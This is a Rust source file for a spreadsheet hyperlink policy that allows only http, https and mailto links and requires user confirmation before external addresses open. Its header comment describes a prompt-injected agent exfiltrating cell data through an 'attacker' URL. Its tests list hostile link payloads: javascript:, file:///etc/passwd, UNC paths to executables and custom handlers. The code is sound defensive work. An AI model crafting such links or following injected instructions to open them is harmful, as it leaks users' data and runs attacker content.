//! Which hyperlink targets may be opened. A cell's link comes from the document (often a file
//! somebody sent), so it is hostile input: only `http`, `https` and `mailto` ever leave the
//! workbook for the system; `file:`, `smb:`, UNC paths, custom URL handlers, `javascript:` and
//! the like are refused. Everything without a scheme stays an in-workbook reference.
//!
//! Opening an allowed address also needs the user's say-so (#2181): `link.open` is reachable by
//! the control channel, the CLI, MCP and workbook scripts, so a prompt-injected agent could open
//! `https://attacker/?d=<cell data>`. Under the default [`LinkPolicy::Confirm`] the command refuses
//! external addresses; only the host, after showing the address and getting OK from the user,
//! opens one through [`crate::Session::open_confirmed_link`], which no command reaches.

use gridcraft_core::RangeRef;
use serde_json::{Value as Json, json};

use crate::{EngineError, Result, Session, UiRequest};

/// Whether `link.open` may hand an external (`http`/`https`/`mailto`) address to the host without
/// asking. Set by the host in code, never by a command, so a programmatic caller can't widen it.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum LinkPolicy {
    /// `link.open` refuses external addresses; the user opens them by clicking the link, which
    /// asks first ([`Session::open_confirmed_link`]). References still navigate.
    #[default]
    Confirm,
    /// The host trusts every caller of this session (an embedding that vets requests itself):
    /// `link.open` opens allowed addresses directly. Disallowed schemes stay refused.
    Allow,
}

/// The error a programmatic `link.open` of a web or e-mail address returns.
pub const NEEDS_CONFIRMATION: &str = "Web and e-mail links open only when the user clicks them and confirms; a command can't open them.";

impl Session {
    /// Opens a link the user has just confirmed in the host's "Open Hyperlink" prompt: an allowed
    /// address goes to the host (`UiRequest::OpenUrl`), a reference selects, anything else is
    /// refused ([`classify`]). Not a command: only host code that showed the user this exact
    /// address may call it.
    pub fn open_confirmed_link(&mut self, target: &str) -> Result<Json> {
        match classify(target) {
            LinkKind::Internal(r) => self.execute("edit.goTo", json!({"reference": r.trim_start_matches('#')})),
            LinkKind::External(u) => {
                self.ui_requests.push(UiRequest::OpenUrl(u.clone()));
                Ok(json!({"opened": u}))
            }
            LinkKind::Refused(why) => Err(EngineError::Other(why)),
        }
    }
}

/// What a link target is.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum LinkKind {
    /// A cell, range, name or table of the workbook (`Sheet2!A1`, `Total`).
    Internal(String),
    /// An address to hand to the system, trimmed: `http`, `https` or `mailto` only.
    External(String),
    /// Refused, with the reason to show.
    Refused(String),
}

const ALLOWED: [&str; 3] = ["http", "https", "mailto"];

/// Classifies a link target. Never panics; the single place that decides what may be opened.
pub fn classify(target: &str) -> LinkKind {
    let t = target.trim();
    if t.chars().any(char::is_control) {
        return LinkKind::Refused("The link contains control characters.".into());
    }
    if t.starts_with("\\\\") || t.starts_with("//") {
        return LinkKind::Refused("Links to network locations aren't opened.".into());
    }
    if RangeRef::parse(t).is_some() {
        return LinkKind::Internal(t.to_string());
    }
    let Some((scheme, rest)) = t.split_once(':') else { return LinkKind::Internal(t.to_string()) };
    let scheme_like = scheme.chars().next().is_some_and(|c| c.is_ascii_alphabetic())
        && scheme.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'));
    if !scheme_like {
        return LinkKind::Internal(t.to_string());
    }
    let lower = scheme.to_ascii_lowercase();
    if ALLOWED.contains(&lower.as_str()) && !rest.trim().is_empty() {
        LinkKind::External(t.to_string())
    } else {
        LinkKind::Refused(format!("Links of type \"{lower}:\" aren't opened. Only http, https and mailto links are allowed."))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_http_https_and_mailto_leave_the_workbook() {
        for ok in ["http://a.example/x", "HTTPS://A.example", "  https://a.example  ", "MailTo:a@b.example"] {
            assert!(matches!(classify(ok), LinkKind::External(_)), "{ok}");
        }
        assert_eq!(classify(" https://a.example "), LinkKind::External("https://a.example".into()));
        for bad in [
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "file:///etc/passwd",
            "smb://host/share",
            "ms-excel:ofe|u|http://x",
            "\\\\host\\share\\x.exe",
            "//host/share",
            "C:\\Windows\\calc.exe",
            "\tjavascript:1",
            "java\nscript:1",
            "\u{1}http://a.example",
            "http:",
            "mailto:",
            "x-custom://a",
        ] {
            assert!(matches!(classify(bad), LinkKind::Refused(_)), "{bad:?} -> {:?}", classify(bad));
        }
    }

    #[test]
    fn references_stay_internal() {
        for r in ["Sheet2!A1", "'My Sheet'!B2:C3", "A1:B2", "#Sheet1!A1", "Total", "", "   "] {
            assert!(matches!(classify(r), LinkKind::Internal(_)), "{r:?} -> {:?}", classify(r));
        }
    }
}
